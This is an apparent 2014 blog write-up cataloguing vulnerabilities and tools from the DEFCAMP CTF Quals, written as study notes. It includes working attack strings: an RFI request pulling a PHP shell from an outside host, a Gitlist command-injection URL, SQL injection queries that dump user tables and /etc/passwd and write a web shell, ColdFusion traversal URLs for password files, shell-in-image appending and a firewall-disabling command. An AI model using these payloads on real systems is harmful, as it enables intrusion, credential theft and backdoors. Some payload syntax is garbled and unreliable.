Title: Exploring D-CTF Quals 2014's Exploits
Date: 2014-10-22 6:30
Category: Web Security
Tags: Linux, RFI, SQL_injection, LFI, RCE, PHP, CMS, ApPHP, unoconv, ColdFusion, Buffer_Overflow, Steganography, Wireshark, ExifTool, netsh, CTF, scapy, RIPS, Heartbleed, nmap



Last weekend I played some of the [DEFCAMP CTF Quals]. It was pretty intense. For (my own)  organizational purposes, I made a list of all the technologies and vulnerabilities found in this CTF, some based on my team's game, some based on the [CTF write-ups git repo].


[CTF write-ups git repo]: https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/
[DEFCAMP CTF Quals]: http://dctf.defcamp.ro/challs



## Vulnerabilities



### Remote File Inclusion and Local File Inclusion Vulnerabilities

In [Remote File Inclusion] (RFI) an attacker can load exploits to the server. An attacker can use RFI to run exploits in both server and client sides. PHP's [include()](http://php.net/manual/en/function.include.php) is extremely vulnerable to RFI attacks.


[Local File Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion) (LFI) is similar to RFI but only files that are currently in the server can be included.  This type of vulnerability is seemed in forms for file uploading (with improper sanitation).

An example of RFI exploitation is the case where the form only accepts some type of extensions (such as JPG or PNG) but the verification is made in the client side. In this case, an attacker can tamper the HTTP requests to send shellcode (with PHP extension, for example). I've shown examples of this attack in the  [Natas post]. There  I've explained that the trick was to rename a PHP shell code to one of these safe extensions.


[Remote File Inclusion]: http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion




### TimThumb and LFI

[TimThumb] is a PHP script for manipulating web images. It was recently [discontinued because of security issues].

With TimThumb 1.33, an attacker is able to upload a shell by appending it to an image. All she needs to do is to have it in some online subdomain. TimThumb will store this image in a cache folder and generate an MD5 of the full path of the shell. The last step is to perform an LFI attack with the shell in this folder. Check this [example of LFI exploitation](http://kaoticcreations.blogspot.com/2011/12/lfi-tip-how-to-read-source-code-using.html).



[TimThumb]: https://code.google.com/p/timthumb/
[discontinued because of security issues]:http://www.binarymoon.co.uk/2014/09/timthumb-end-life/





### CMS Mini and RFI


[CMS Mini] is a file system to build simple websites. It has [several vulnerabilities] such as [CSRF], RFI, and [XSS].

[CSRF]: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
[XSS]: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)


An example of RFI vulnerability in CMS Mini is explored using curl:

```http
http://
[target/IP]/cmsmini/admin/edit.php?path=&name=../../../../../etc/passwd
```

For more examples of exploits, check [1337day] and [this exploit-db].

[1337day]: http://1337day.com/exploit/3256
[several vulnerabilities]: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-2961

[this exploit-db]: http://www.exploit-db.com/exploits/28128/
[CMS Mini]: http://www.mini-print.com/
















### ApPHP and Remote Code Execution

[ApPHP](http://www.apphp.com/) is a blog script. It is known for having  [several vulnerabilities], including [remote code execution] (RCE). An example of RCE exploit for ApPHP [can be seen here]. A good start is to check the PHP's [disable_function](http://php.net/manual/en/ini.core.php#ini.disable-functions) list for stuff to hacker the server.

[several vulnerabilities]: http://www.exploit-db.com/exploits/33030/
[remote code execution]: https://www.owasp.org/index.php/PHP_Top_5#P1:_Remote_Code_Execution

[can be seen here]: http://www.exploit-db.com/exploits/33070/



In this CTF, the challenge was to find what was not in that list. For instance, it was possible to use [$_POST](http://php.net/manual/en/reserved.variables.post.php) and [$_COOKIE](http://php.net/manual/en/reserved.variables.cookies.php) to send strings to functions such as [scandir()](http://php.net/manual/en/function.scandir.php) and [get_file_contents()](http://php.net/manual/en/function.file-get-contents.php):

```http
GET Request: ?asdf);print_r(scandir(implode($_COOKIE))=/
Cookie: 0=include
```

In addition, with a writable directory we can drop a shell in the server (you can use script-kiddies scripts like [r57 shell.net](http://www.r57shell.net/), but in real life, keep in mind that they are super uber [backdoored](http://thehackerblog.com/hacking-script-kiddies-r57-gen-tr-shells-are-backdoored-in-a-way-you-probably-wouldnt-guess/#more-447)).

```http
Post Request: 0=include/myfile.php
Cookie: 0=http://www.r57shell.net/shell/r57.txt
```


### Gitlist and Remote Command Execution

[Gitlist] is an application to browse GitHub repositories in a browser. The versions up to 5.0 are known for [allowing remote attackers to execute arbitrary commands via shell], a type of [command injection]. Exploits for this vulnerability can be seen at [hatriot], at [packet storm], at [1337day], and at [exploit-db].

In this CTF, the following command could be used to look for the flag:

```http
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60
```


[exploit-db]: http://www.exploit-db.com/exploits/33990/
[1337day]: http://en.1337day.com/exploit/22391
[packet storm]: http://packetstormsecurity.com/files/127364/Gitlist-Unauthenticated-Remote-Command-Execution.html
[hatriot]: http://hatriot.github.io/blog/2014/06/29/gitlist-rce/
[command injection]: http://cwe.mitre.org/data/definitions/77.html
[allowing remote attackers to execute arbitrary commands via shell]: http://www.websecuritywatch.com/arbitrary-command-execution-in-gitlist/
[Gitlist]: http://gitlist.org/


### LibreOffice's Socket Connections

LibreOffice's has a binary [soffice.bin] that takes socket connections on the *port 2002* (in this CTF, in the VPN's localhost).

For instance, the command [unoconv] can be used to convert a file to a LibreOffice supported format. The flag **-c** opens a connection by the client to connect to an LibreOffice instance. It also can be used by the listener to make LibreOffice listen.

From the documentation, the default connection string is:

```http
Default connection string is "socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"
```

Therefore, you can connect to the socket and convert some document (such as */flag.txt*) to a PDF for example:

```sh
$ unoconv --connection 'socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext' -f pdf /flag.txt
```

An example of a payload can be seen [here].


[here]: https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400
[unoconv]: http://linux.die.net/man/1/unoconv
[LibreOffice]: http://www.libreoffice.org/
[soffice.bin]: http://www.processlibrary.com/en/directory/files/soffice/66728/

### ColdFusion and Local File Disclosure

[ColdFusion] is an old web application development platform. It carries its own (interpreted) language, **CFM**, with a Java backend.

CFM has scripting features like ASP and PHP, and syntax resembling HTML and JavaScript.  ColdFusion scripts  have **cfm** and **cfc** file extension. For instance,  [Adobe ColdFusion 11] and [Railio 4.2], the two platform accepting CFM,  were both released in the beginning of 2014.

The problem is that CFM is [vulnerable to a variety of attacks], including [Local File Disclosure](https://www.owasp.org/index.php/Full_Path_Disclosure) (LFD) and SQL injection (SQLi). Adding this to the fact that ColdFusion scripts usually run on elevated privileged users, we have a very vulnerable platform.

[Railio 4.2]: http://www.getrailo.org/
[ColdFusion]: http://en.wikipedia.org/wiki/Adobe_ColdFusion
[Adobe ColdFusion 11]: http://www.adobe.com/products/coldfusion-family.html


#### SQL Injection (SQLi)


[SQL Injection](https://www.owasp.org/index.php/SQL_Injection) is a classic attack where one injects exploits in a [SQL query](http://technet.microsoft.com/en-us/library/bb264565(v=sql.90).aspx). Vulnerabilities of this type can be spotted in queries such as **index.php?id=1**. I showed some of these exploits in my [Natas post].

In this CTF, these were  some of the  exploits that could be used:

* List everything  in a database, where **0x3a** is the hexadecimal symbol for **:**:
```sql
UNION ALL SELECT 1,concat(username,0x3a,password,0x3a,email),3 FROM cms.users--
```

* See the password file content:
```sql
UNION ALL SELECT 1,LOAD_FILE("/etc/passwd"),3--
```

* Write files and create a PHP shell into **URL/shell.php**, we can use a parameter **x** to takes a parameter to be executed (based on [this]):

```
UNION ALL SELECT 1 "<?php header("Content-Type: text/plain;charset=utf-8"); echo system($-GET["x"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php"--
```

Notice the *trailing pair of hyphens* **--** which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed (it removes the trailing single-quote left over from the modified query). To learn more about how to mitigate SQLi, I recommend [OWASP's SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
) and [this nice guide for SQLi mitigation](http://owtf.github.io/boilerplate-templates/SQLinjection.html) by OWSAP OWTF.



By the way, it's useful in general to know [HTML URL Encoding] to craft these URLs.

[this]: https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/web-400
[HTML URL Encoding]: http://www.w3schools.com/tags/ref_urlencode.asp




### CesarFTP 0.99g and Buffer Overflow

[CesarFTP 0.99g](http://www.softpedia.com/get/Internet/Servers/FTP-Servers/Cesar-FTP.shtml) is an easy-to-use  FTP server. It is also known for having several vulnerabilities, including [buffer overflow](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2961).

For example, see this exploit for **Metasploit** from [exploit-db](http://www.exploit-db.com/exploits/16713/) (or [an older one here](http://www.exploit-db.com/exploits/1906/)).



#### File Disclosure of Password Hashes

This vulnerability provides a 30-second window in the Administration panel, which can e use to write a shellcode. The main idea is a [directory traversal] to the **password.proprieties** that can be used to login in the server.

Ingredients of this attack are:

* The target must have ColdFusion administrator available, which is by default mapped to ***CFIDE/administrator/enter.cfm***. If it gets [500], it should be switched to HTTPS.

* At the ColdFusion administrator, verify the version, and then use these injections:

```
(Version 6): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en

(Version 7): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en

(Version 8): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

(All versions): http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
```

* Now a shell can be written to a file and added in **Schedule New Task**. See detailed instructions at [blackhatlib], at [infointox], at [gnucitizen], at [kaoticcreations], at [cyberguerilla], at [jumpespjump], and at [hexale].


[jumpespjump]: http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html
[kaoticcreations]: http://kaoticcreations.blogspot.com/2012/11/hacking-cold-fusion-servers-part-i.html
[cyberguerilla]: https://www.cyberguerrilla.org/blog/?p=18275
[vulnerable to a variety of attacks]: http://www.intelligentexploit.com/view-details.html?id=12750
[gnucitizen]: http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
[hexale]: http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html
[infointox]: http://www.infointox.net/?p=59
[directory traversal]: https://www.owasp.org/index.php/Path_Traversal
[500]: http://en.wikipedia.org/wiki/List_of_HTTP_status_codes
[blackhatlib]: http://www.blackhatlibrary.net/Coldfusion_hacking

----


## Useful Tools


### Vulnerability Scanners

Vulnerability scanners can be useful for several problems. For instance, for a PHP static source code analyzer, we can use [RIPS](http://rips-scanner.sourceforge.net/).

In this CTF we had to scan for [Heartbleed](http://en.wikipedia.org/wiki/Heartbleed), and we used [this script](https://gist.githubusercontent.com/eelsivart/10174134/raw/5c4306a11fadeba9d9f9385cdda689754ca4d362/heartbleed.py).

### Scapy

[Scapy](http://packetlife.net/blog/2011/may/23/introduction-scapy/) is a Python lib for crafting packets. It can be useful for problems such as [port knocking](http://en.wikipedia.org/wiki/Port_knocking). For illustration, check this [example from PHD CTF 2011](http://eindbazen.net/2011/12/phd-ctf-quals-2011-%E2%80%93-port-knocking/) and this from [ASIS CTF 2014](http://blog.dul.ac/2014/05/ASISCTF14/). Check [this project](https://code.google.com/p/pypk/source/browse/branches/release-0.1.0/knocker.py?r=3) too.


### Steganography

One of the questions had a reference to the [paranoia.jar] tool, which hides text in an image file using [128 bit AES](http://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encryption.

To run the tool (after downloading it) just do:

```sh
java -jar paranoia.jar
```

[paranoia.jar]: https://ccrma.stanford.edu/~eberdahl/Projects/Paranoia/

### HTTP/HTTPS Request Tampering

Very useful for the RFI problems (but not limited to them):

* [Tamper Data]: view and modify HTTP/HTTPS headers.
* [Burp]: a Java application to secure or penetrate web applications.


[Burp]: http://portswigger.net/burp/
[Tamper Data]: https://addons.mozilla.org/en-US/firefox/addon/tamper-data/


### Wireshark

At some point I'm going to dedicate an entire post for [Wireshark](https://www.wireshark.org/), but for this CTF the important things to know were:

* Look for POST requests:
```
http.request.method == "POST"
```
* Submit the found data (same username, nonce, and password) with the command:
```
$ curl --data 'user=manager&nonce=7413734ab666ce02cf27c9862c96a8e7&pass=3ecd6317a873b18e7dde351ac094ee3b' HOST
```


### [Exif] data extractor:

[ExifTool]  is used for reading, writing, and manipulating image metadata:
```sh
$ tar -xf Image-ExifTool-9.74.tar.gz
$  cd Image-ExifTool-9.74/
$ perl Makefile.PL
$ make test
$ sudo make install
$ exiftool IMAGEFILE
```

### MD5 Lookups

Several hashes in this CTF needed to be searched. Google, in general, does a good job, but here are some specific websites: [hash-killer] and [md5this].


[hash-killer]: http://hash-killer.com/
[md5this]: http://www.md5this.com/


### In the Shell

* **Hexadecimal decoders** are essential. You can use Python's [hex](https://docs.python.org/2/library/functions.html#hex):

```sh
$ python -c 'print "2f722f6e6574736563".decode("hex")'
/r/netsec
```

or command line [xxd]:

```sh
$ yum install vim-common
$ xxd -r -p <<< 2f722f6e6574736563
/r/netsec
```

* **Base64 decoders** are also essential:

```sh
$ base64 --decode <<< BASE64STRING > OUTPUT
```

* **nmap**, obviously. You can use it in Python scripts, using the [subprocess](https://docs.python.org/2/library/subprocess.html) library:
```python
print "[*] Scanning for open ports using nmap"
subprocess.call("nmap -sS -sV -T4 -p 22-2048 " + base_URL, shell=True)
```


* **tee** is nice to store and view the output of another command. It can be very useful with *curl*. A simple  example:
```sh
$ ls | tee file
```


* **chattr** is used to change the file attributes of a Linux file system. For example, the command ```chattr +i``` on a file make it not be able to be removed (useful for *zombie* processes hunting).

* **nm** is useful for listing symbols from object files


* **md5 hashing** is used all the time:

```sh
$ echo -n password | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
```


* You might want to **append a shell code to an image** (for example, a GIF file):
```sh
$ cat PHP-shell.php >> fig.gif
```

* Now a special one: Windows! One of the trivia questions in this CTF. How to disable the Windows XP Firewall from the command line:
```sh
netsh firewall set opmode mode=DISABLE.
```



[tcpdump]: http://linux.die.net/man/8/tcpdump
[ExifTool]: http://www.sno.phy.queensu.ca/~phil/exiftool/index.html
[Exif]: http://en.wikipedia.org/wiki/Exchangeable_image_file_format
[writeups]: https://github.com/ctfs/write-ups/tree/master/d-ctf-2014/misc-100
[xxd]: http://linuxcommand.org/man_pages/xxd1.html
[Natas post]: http://singularity-sh.vercel.app/exploiting-the-web-in-20-lessons-natas.html
